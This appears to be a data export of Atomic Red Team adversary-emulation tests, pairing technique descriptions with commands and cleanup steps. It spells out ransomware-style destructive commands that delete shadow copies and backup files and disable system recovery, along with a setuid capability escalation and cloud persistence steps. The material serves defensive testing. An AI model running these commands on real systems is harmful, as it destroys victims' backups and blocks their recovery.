nodes.name: Cleanup for DLL Search Order Hijacking,DLL Sideloading Of KeyScramblerIE.DLL Via KeyScrambler.EXE
nodes.description: Write-Host 1.Kindly close the popup window asking for KeyScramblerIE.dll ,so that it gets deleted. Remove-Item -Path $env:Temp\KeyScrambler_Setup.exe Start-Process -FilePath "C:\Program Files (x86)\KeyScrambler\Uninstall.exe" -ArgumentList /S -Wait Remove-Item -Path $env:Temp\KeyScrambler.exe Write-Host 2.KeyScrambler cleanup completed successfully.

nodes.name: Inhibit System Recovery
nodes.description: Atomic Red Team technique: Inhibit System Recovery

nodes.name: Windows - Delete Volume Shadow Copies
nodes.description: Deletes Windows Volume Shadow Copies. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer. Upon execution, if no shadow volumes exist the message "No items found that satisfy the query." will be displayed. If shadow volumes are present, it will delete them without printing output to the screen. This is because the /quiet parameter was passed which also suppresses the y/n confirmation prompt. Shadow copies can only be created on Windows server or Windows 8. https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc788055(v=ws.11)

nodes.name: Command for Windows - Delete Volume Shadow Copies
nodes.description: vssadmin.exe delete shadows /all /quiet

nodes.name: Windows - Delete Volume Shadow Copies via WMI
nodes.description: Deletes Windows Volume Shadow Copies via WMI. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer.

nodes.name: Command for Windows - Delete Volume Shadow Copies via WMI
nodes.description: wmic.exe shadowcopy delete

nodes.name: Windows - wbadmin Delete Windows Backup Catalog
nodes.description: Deletes Windows Backup Catalog. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer. Upon execution, "The backup catalog has been successfully deleted." will be displayed in the PowerShell session.

nodes.name: Command for Windows - wbadmin Delete Windows Backup Catalog
nodes.description: wbadmin delete catalog -quiet

nodes.name: Windows - Disable Windows Recovery Console Repair
nodes.description: Disables repair by the Windows Recovery Console on boot. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer. Upon execution, "The operation completed successfully." will be displayed in the powershell session.

nodes.name: Command for Windows - Disable Windows Recovery Console Repair
nodes.description: bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures bcdedit.exe /set {default} recoveryenabled no

nodes.name: Cleanup for Windows - Disable Windows Recovery Console Repair
nodes.description: bcdedit.exe /set {default} bootstatuspolicy DisplayAllFailures >nul 2>&1 bcdedit.exe /set {default} recoveryenabled yes >nul 2>&1

nodes.name: Windows - Delete Volume Shadow Copies via WMI with PowerShell
nodes.description: Deletes Windows Volume Shadow Copies with PowerShell code and Get-WMIObject. This technique is used by numerous ransomware families such as Sodinokibi/REvil. Executes Get-WMIObject. Shadow copies can only be created on Windows server or Windows 8, so upon execution there may be no output displayed.

nodes.name: Command for Windows - Delete Volume Shadow Copies via WMI with PowerShell
nodes.description: Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}

nodes.name: Windows - Delete Backup Files
nodes.description: Deletes backup files in a manner similar to Ryuk ransomware. Upon exection, many "access is denied" messages will appear as the commands try to delete files from around the system.

nodes.name: Command for Windows - Delete Backup Files
nodes.description: del /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.* c:\backup*.* c:\*.set c:\*.win c:\*.dsk

nodes.name: Windows - wbadmin Delete systemstatebackup
nodes.description: Deletes the Windows systemstatebackup using wbadmin.exe. This technique is used by numerous ransomware families. This may only be successful on server platforms that have Windows Backup enabled.

nodes.name: Command for Windows - wbadmin Delete systemstatebackup
nodes.description: wbadmin delete systemstatebackup -keepVersions:0

nodes.name: Windows - Disable the SR scheduled task
nodes.description: Use schtasks.exe to disable the System Restore (SR) scheduled task

nodes.name: Command for Windows - Disable the SR scheduled task
nodes.description: schtasks.exe /Change /TN "\Microsoft\Windows\SystemRestore\SR" /disable

nodes.name: Cleanup for Windows - Disable the SR scheduled task
nodes.description: schtasks.exe /Change /TN "\Microsoft\Windows\SystemRestore\SR" /enable >nul 2>&1

nodes.name: Disable System Restore Through Registry
nodes.description: Modify the registry of the currently logged in user using reg.exe via cmd console to disable system restore on the computer. See how remcos RAT abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details

nodes.name: Command for Disable System Restore Through Registry
nodes.description: reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableConfig" /t "REG_DWORD" /d "1" /f reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableSR" /t "REG_DWORD" /d "1" /f reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableConfig" /t "REG_DWORD" /d "1" /f reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableSR" /t "REG_DWORD" /d "1" /f

nodes.name: Cleanup for Disable System Restore Through Registry
nodes.description: reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableConfig" /f >nul 2>&1 reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableSR" /f >nul 2>&1 reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableConfig" /f >nul 2>&1 reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableSR" /f >nul 2>&1

nodes.name: Windows - vssadmin Resize Shadowstorage Volume
nodes.description: Adversaries generally try to Resize Shadowstorage Volume using vssadmin.exe to avoid the shadow volumes being made again. This technique is typically found used by adversaries during a ransomware event and a precursor to deleting the shadowstorage.

nodes.name: Command for Windows - vssadmin Resize Shadowstorage Volume
nodes.description: vssadmin resize shadowstorage /For=C: /On=C: /MaxSize=20%

nodes.name: Modify VSS Service Permissions
nodes.description: This atomic test alters the security settings of the Volume Shadow Copy Service (VSS) by modifying its permissions, potentially impacting system recovery operations. The specific permissions set by the command are as follows: - Deny Generic All (GA) permissions to Network Users (NU) - Deny GA permissions to Everyone (WD) - Deny GA permissions to Anonymous (AN) - Allow Full Access (FA) and Generic All (GA) permissions to Everyone (WD) in System ACL (SACL) - Allow Object Inherit and Inherit Only (OIIO) Full Access (FA) and GA permissions to Everyone (WD) in SACL These permissions can significantly restrict VSS functionalities, including backup and restore operations. As such, it is essential to run this test only in a controlled environment with administrative privileges. A cleanup command is provided to reset VSS permissions to a common default configuration, which should be verified against your specific system's configuration. It's crucial to use this cleanup command after testing to ensure the system's backup and recovery capabilities remain functional. Running this test on a production system or critical environment is not recommended without proper precautions and a robust recovery plan.

nodes.name: Command for Modify VSS Service Permissions
nodes.description: sc sdset VSS D:(D;;GA;;;NU)(D;;GA;;;WD)(D;;GA;;;AN)S:(AU;FA;GA;;;WD)(AU;OIIOFA;GA;;;WD)

nodes.name: Cleanup for Modify VSS Service Permissions
nodes.description: sc sdset VSS D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;LC;;;BU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)

nodes.name: Disable Time Machine
nodes.description: Disables Time Machine which is Apple's automated backup utility software. Attackers can use this to prevent backups from occurring and hinder the victim's ability to recover from any damage.

nodes.name: Command for Disable Time Machine
nodes.description: sudo tmutil disable

nodes.name: Cleanup for Disable Time Machine
nodes.description: sudo tmutil enable

nodes.name: Windows - Delete Volume Shadow Copies via Diskshadow
nodes.description: Deletes Windows Volume Shadow Copies via Diskshadow binary. This technique is used by numerous ransomware families such as Crytox. The binary is present by default in Windows Server operating systems (since Windows Server 2008). Upon execution, it will delete all shadow copies of the server.

nodes.name: Command for Windows - Delete Volume Shadow Copies via Diskshadow
nodes.description: "delete shadows all" | diskshadow.exe

nodes.name: Abuse Elevation Control Mechanism: Setuid and Setgid
nodes.description: Atomic Red Team technique: Abuse Elevation Control Mechanism: Setuid and Setgid

nodes.name: Make and modify binary from C source
nodes.description: Make, change owner, and change file attributes on a C source code file

nodes.name: Make and modify capabilities of a binary
nodes.description: Make and modify [capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html) of a C source code file. The binary doesn't have to modify the UID, but the binary is given the capability to arbitrarily modify it at any time with `setuid(0)`. Without being owned by root, the binary can set the UID to 0.

nodes.name: Command for Make and modify capabilities of a binary
nodes.description: cp #{payload} /tmp/cap.c make /tmp/cap sudo setcap cap_setuid=ep /tmp/cap /tmp/cap

nodes.name: Cleanup for Make and modify capabilities of a binary

nodes.name: Provide the SetUID capability to a file
nodes.description: This test gives a file the capability to set UID without using flags.

nodes.name: Cleanup for Provide the SetUID capability to a file

nodes.name: Do reconnaissance for files that have the setuid bit set

nodes.name: Do reconnaissance for files that have the setgid bit set

nodes.name: Valid Accounts: Cloud Accounts
nodes.description: Atomic Red Team technique: Valid Accounts: Cloud Accounts

nodes.name: Creating GCP Service Account and Service Account Key
nodes.description: GCP Service Accounts can be used to gain intial access as well as maintain persistence inside Google Cloud.

nodes.name: google-workspace
nodes.description: Supported platform: google-workspace

nodes.name: iaas:gcp
nodes.description: Supported platform: iaas:gcp

nodes.name: Command for Creating GCP Service Account and Service Account Key
nodes.description: gcloud config set project #{project-id} gcloud iam service-accounts create #{service-account-name} gcloud iam service-accounts keys create #{output-key-file} --iam-account=#{service-account-email}

nodes.name: Cleanup for Creating GCP Service Account and Service Account Key
nodes.description: gcloud iam service-accounts delete #{service-account-email} --quiet

nodes.name: Azure Persistence Automation Runbook Created or Modified
nodes.description: Identifies when an Azure Automation runbook is created or modified. An adversary may create or modify an Azure Automation runbook to execute malicious code and maintain persistence in their target's environment.

nodes.name: iaas:azure
nodes.description: Supported platform: iaas:azure

nodes.name: Command for Azure Persistence Automation Runbook Created or Modified
nodes.description: New-AzAutomationRunbook -Name #{runbook_name} -Type PowerShell -ResourceGroupName #{resource_group} -Description 'my-test-runbook' -AutomationAccountName #{automation_account_name}

nodes.name: Cleanup for Azure Persistence Automation Runbook Created or Modified
nodes.description: Remove-AzAutomationRunbook -AutomationAccountName #{automation_account_name} -Name #{runbook_name} -ResourceGroupName #{resource_group} -Force Remove-AzAutomationAccount -ResourceGroupName #{resource_group} -Name #{automation_account_name} -Force Remove-AzResourceGroup -Name #{resource_group} -Force echo "Cleanup should be completed. Run 'terraform destroy` to ensure remaining resources are also deleted." cd "$PathToAtomicsFolder/T1078.004/src/T1078.004-2/" terraform destroy -auto-approve

nodes.name: GCP - Create Custom IAM Role
nodes.description: This atomic will create a new IAM role. The default role permissions are: *IAM Service Account Get*. The idea for this Atomic came from a Rule published by the Elastic team. Identifies an Identity and Access Management (IAM) custom role creation in Google Cloud Platform (GCP). Custom roles are user-defined, and allow for the bundling of one or more supported permissions to meet specific needs. Custom roles will not be updated automatically and could lead to privilege creep if not carefully scrutinized. This atomic will create a new IAM role. The default role permissions are: *IAM Service Account Get* Reference: https://github.com/elastic/detection-rules/blob/main/rules/integrations/gcp/initial_access_gcp_iam_custom_role_creation.toml

nodes.name: Command for GCP - Create Custom IAM Role
nodes.description: gcloud config set project #{project-id} gcloud iam roles create #{role-name} --description="#{role-description}" --permissions=#{roles} --project=#{project-id}

nodes.name: Cleanup for GCP - Create Custom IAM Role
nodes.description: gcloud iam roles delete #{role-name} --project=#{project-id}

nodes.name: System Service Discovery
nodes.description: Atomic Red Team technique: System Service Discovery

nodes.name: System Service Discovery
nodes.description: Identify system services. Upon successful execution, cmd.exe will execute service commands with expected result to stdout.

nodes.name: Command for System Service Discovery
nodes.description: tasklist.exe /svc sc query sc query state= all

nodes.name: System Service Discovery - net.exe
nodes.description: Enumerates started system services using net.exe and writes them to a file. This technique has been used by multiple threat actors. Upon successful execution, net.exe will run from cmd.exe that queries services. Expected output is to a txt file in in the temp directory called service-list.txt.

nodes.name: Command for System Service Discovery - net.exe
nodes.description: net.exe start >> #{output_file}

nodes.name: Cleanup for System Service Discovery - net.exe
nodes.description: del /f /q /s #{output_file} >nul 2>&1

nodes.name: System Service Discovery - systemctl/service
nodes.description: Enumerates system service using systemctl/service

nodes.name: Command for System Service Discovery - systemctl/service
nodes.description: if [ "$(uname)" = 'FreeBSD' ]; then service -e; else systemctl --type=service; fi;

nodes.name: Get-Service Execution
nodes.description: Executes the Get-Service cmdlet to gather objects representing all services on the local system.

nodes.name: Command for Get-Service Execution
nodes.description: powershell.exe Get-Service

nodes.name: System Service Discovery - macOS launchctl
nodes.description: Enumerates services on macOS using launchctl. Used by adversaries for identifying daemons, background services, and persistence mechanisms.

nodes.name: Command for System Service Discovery - macOS launchctl
nodes.description: launchctl list

nodes.name: System Service Discovery - Windows Scheduled Tasks (schtasks)
nodes.description: Enumerates scheduled tasks on Windows using schtasks.exe.

nodes.name: Command for System Service Discovery - Windows Scheduled Tasks (schtasks)
nodes.description: schtasks /query /fo LIST /v

nodes.name: System Service Discovery - Services Registry Enumeration
nodes.description: Enumerates Windows services by reading the Services registry key (HKLM\SYSTEM\CurrentControlSet\Services) instead of using Service Control Manager APIs or CLI tools such as sc.exe or Get-Service.

nodes.name: Command for System Service Discovery - Services Registry Enumeration
nodes.description: Get-ChildItem -Path 'HKLM:\SYSTEM\CurrentControlSet\Services' | ForEach-Object { $p = Get-ItemProperty -Path $_.PSPath -ErrorAction SilentlyContinue [PSCustomObject]@{ Name = $_.PSChildName DisplayName = $p.DisplayName ImagePath = $p.ImagePath StartType = $p.Start } }

nodes.name: System Service Discovery - Linux init scripts
nodes.description: Enumerates system services by listing SysV init scripts and runlevel symlinks under /etc/init.d and /etc/rc*.d.

nodes.name: Command for System Service Discovery - Linux init scripts
nodes.description: echo "[*] Listing SysV init scripts (/etc/init.d):" if [ -d /etc/init.d ]; then ls -l /etc/init.d; else echo "/etc/init.d not present on this system"; fi echo echo "[*] Listing runlevel directories (/etc/rc*.d):" ls -ld /etc/rc*.d 2>/dev/null || echo "No /etc/rc*.d directories found"
